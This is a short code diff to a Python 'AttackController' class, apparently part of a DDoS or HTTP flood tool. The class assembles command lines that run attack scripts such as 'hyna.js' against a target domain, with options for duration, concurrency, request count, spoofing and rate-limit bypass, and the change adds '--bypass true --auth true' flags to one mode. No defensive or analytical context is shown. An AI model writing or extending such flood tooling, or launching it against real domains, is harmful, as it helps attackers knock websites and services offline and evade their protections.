@@ -218,7 +218,7 @@ class AttackController:
         if modeValue == 'xvfb-run node hyna.js':
             attackCommand = f'{modeValue} {domainName} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --ratelimit {bypassRateLimitValue}'
         else:
-            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue}'
+            attackCommand = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} {death_sword_http} --ratelimit {bypassRateLimitValue} --bypass true --auth true --debug true'
         attackCommand = ' '.join(attackCommand.split())
 
         print(attackCommand)
